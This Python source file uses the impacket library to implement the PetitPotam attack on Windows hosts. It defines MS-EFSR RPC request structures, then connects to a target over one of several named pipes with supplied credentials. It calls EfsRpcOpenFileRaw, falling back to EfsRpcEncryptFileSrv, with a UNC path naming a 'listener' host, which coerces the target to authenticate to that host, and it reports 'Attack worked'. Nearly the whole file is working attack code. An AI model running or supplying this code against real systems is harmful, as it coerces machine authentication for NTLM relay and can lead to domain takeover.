#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD, BOOL, PCHAR, RPC_SID, LPWSTR
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code


class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', '20s'),
    )


class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', '20s'),
    )


class EFS_EXIM_PIPE(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', ':'),
    )


class EFS_HASH_BLOB(NDRSTRUCT):
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )


class EFS_RPC_BLOB(NDRSTRUCT):
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )


class EFS_CERTIFICATE_BLOB(NDRSTRUCT):
    structure = (
        ('Type', DWORD),
        ('Data', DWORD),
        ('cbData', PCHAR),
    )


class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_HASH_BLOB),
        ('Display', LPWSTR),
    )


class ENCRYPTION_CERTIFICATE(NDRSTRUCT):
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_CERTIFICATE_BLOB),

    )


class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
    align = 1
    structure = (
        ('Cert', DWORD),
        ('Users', ENCRYPTION_CERTIFICATE_HASH),
    )


class ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):
    structure = (
        ('Type', DWORD),
        ('HASH', ENCRYPTION_CERTIFICATE_HASH_LIST),
        ('Certif', ENCRYPTION_CERTIFICATE),
        ('Blob', EFS_RPC_BLOB),
    )


class EFS_RPC_BLOB(NDRSTRUCT):
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )


class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', ':'),
    )


class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ('fileName', WSTR),
        ('Flag', ULONG),
    )


class EfsRpcOpenFileRawResponse(NDRCALL):
    structure = (
        ('hContext', EXIMPORT_CONTEXT_HANDLE),
        ('ErrorCode', ULONG),
    )


class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (
        ('FileName', WSTR),
    )


class EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (
        ('FileName', WSTR),
        ('Flag', ULONG),
    )


class EfsRpcDecryptFileSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcQueryUsersOnFile(NDRCALL):
    opnum = 6
    structure = (
        ('FileName', WSTR),

    )


class EfsRpcQueryUsersOnFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcQueryRecoveryAgents(NDRCALL):
    opnum = 7
    structure = (
        ('FileName', WSTR),

    )


class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcRemoveUsersFromFile(NDRCALL):
    opnum = 8
    structure = (
        ('FileName', WSTR),
        ('Users', ENCRYPTION_CERTIFICATE_HASH_LIST)

    )


class EfsRpcRemoveUsersFromFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcAddUsersToFile(NDRCALL):
    opnum = 9
    structure = (
        ('FileName', WSTR),
        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST)

    )


class EfsRpcAddUsersToFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcFileKeyInfo(NDRCALL):
    opnum = 12
    structure = (
        ('FileName', WSTR),
        ('infoClass', DWORD),
    )


class EfsRpcFileKeyInfoResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
    opnum = 13
    structure = (
        ('SrcFileName', WSTR),
        ('DestFileName', WSTR),
        ('dwCreationDisposition', DWORD),
        ('dwAttributes', DWORD),
        ('RelativeSD', EFS_RPC_BLOB),
        ('bInheritHandle', BOOL),
    )


class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcAddUsersToFileEx(NDRCALL):
    opnum = 15
    structure = (
        ('dwFlags', DWORD),
        ('Reserved', EFS_RPC_BLOB),
        ('FileName', WSTR),
        ('dwAttributes', DWORD),
        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST),
    )


class EfsRpcAddUsersToFileExResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcFileKeyInfoEx(NDRCALL):
    opnum = 16
    structure = (
        ('dwFileKeyInfoFlags', DWORD),
        ('Reserved', EFS_RPC_BLOB),
        ('FileName', WSTR),
        ('InfoClass', DWORD),
    )


class EfsRpcFileKeyInfoExResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcGetEncryptedFileMetadata(NDRCALL):
    opnum = 18
    structure = (
        ('FileName', WSTR),
    )


class EfsRpcGetEncryptedFileMetadataResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcSetEncryptedFileMetadata(NDRCALL):
    opnum = 19
    structure = (
        ('FileName', WSTR),
        ('OldEfsStreamBlob', EFS_RPC_BLOB),
        ('NewEfsStreamBlob', EFS_RPC_BLOB),
        ('NewEfsSignature', ENCRYPTED_FILE_METADATA_SIGNATURE),
    )


class EfsRpcSetEncryptedFileMetadataResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class EfsRpcEncryptFileExSrv(NDRCALL):
    opnum = 21
    structure = (
        ('FileName', WSTR),
        ('ProtectorDescriptor', WSTR),
        ('Flags', ULONG),
    )


class EfsRpcEncryptFileExSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


OPNUMS = {
    0: (EfsRpcOpenFileRaw, EfsRpcOpenFileRawResponse),
    4: (EfsRpcEncryptFileSrv, EfsRpcEncryptFileSrvResponse),
    5: (EfsRpcDecryptFileSrv, EfsRpcDecryptFileSrvResponse),
    6: (EfsRpcQueryUsersOnFile, EfsRpcQueryUsersOnFileResponse),
    7: (EfsRpcQueryRecoveryAgents, EfsRpcQueryRecoveryAgentsResponse),
    8: (EfsRpcRemoveUsersFromFile, EfsRpcRemoveUsersFromFileResponse),
    9: (EfsRpcAddUsersToFile, EfsRpcAddUsersToFileResponse),
    12: (EfsRpcFileKeyInfo, EfsRpcFileKeyInfoResponse),
    13: (EfsRpcDuplicateEncryptionInfoFile, EfsRpcDuplicateEncryptionInfoFileResponse),
    15: (EfsRpcAddUsersToFileEx, EfsRpcAddUsersToFileExResponse),
    16: (EfsRpcFileKeyInfoEx, EfsRpcFileKeyInfoExResponse),
    18: (EfsRpcGetEncryptedFileMetadata, EfsRpcGetEncryptedFileMetadataResponse),
    19: (EfsRpcSetEncryptedFileMetadata, EfsRpcSetEncryptedFileMetadataResponse),
    21: (EfsRpcEncryptFileExSrv, EfsRpcEncryptFileExSrvResponse),

}


def connect(username, password, domain, lmhash, nthash, target, pipe, doKerberos, dcHost, targetIp, listener):
    binding_params = {
        'lsarpc': {
            'stringBinding': r'ncacn_np:%s[\PIPE\lsarpc]' % target,
            'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
        },
        'efsr': {
            'stringBinding': r'ncacn_np:%s[\PIPE\efsrpc]' % target,
            'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')
        },
        'samr': {
            'stringBinding': r'ncacn_np:%s[\PIPE\samr]' % target,
            'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
        },
        'lsass': {
            'stringBinding': r'ncacn_np:%s[\PIPE\lsass]' % target,
            'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
        },
        'netlogon': {
            'stringBinding': r'ncacn_np:%s[\PIPE\netlogon]' % target,
            'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
        },
    }

    rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])

    if hasattr(rpctransport, 'set_credentials'):
        rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash,
                                     nthash=nthash)

    if doKerberos:
        rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
    if targetIp:
        rpctransport.setRemoteHost(targetIp)

    dce = rpctransport.get_dce_rpc()
    dce.set_auth_type(RPC_C_AUTHN_WINNT)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

    try:
        dce.connect()
    except Exception as e:
        print("Something went wrong, check error status => %s" % str(e))
        print("[-] Connecting to %s Error" % binding_params[pipe]['stringBinding'])
        return

    try:
        dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
    except Exception as e:
        print("Something went wrong, check error status => %s" % str(e))
        print("[-] bind %s %s Error" % (pipe, binding_params[pipe]['MSRPC_UUID_EFSR'][0]))
        dce.disconnect()
        return

    try:

        request = EfsRpcOpenFileRaw()
        request['fileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
        request['Flag'] = 0

        resp = dce.request(request)

    except Exception as e:
        if str(e).find('ERROR_BAD_NETPATH') >= 0:
            print("[+] %s connect %s EfsRpcOpenFileRaw Attack worked " % (target, listener))
        else:
            if str(e).find('rpc_s_access_denied') >= 0:
                try:

                    request = EfsRpcEncryptFileSrv()
                    request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
                    resp = dce.request(request)
                except Exception as e:
                    if str(e).find('ERROR_BAD_NETPATH') >= 0:
                        print("[+] %s connect %s EfsRpcEncryptFileSrv Attack worked " % (target, listener))
                    else:
                        print("[-] Attack worked error")

            else:
                print("[-] Attack worked error")
    finally:
        dce.disconnect()
        return
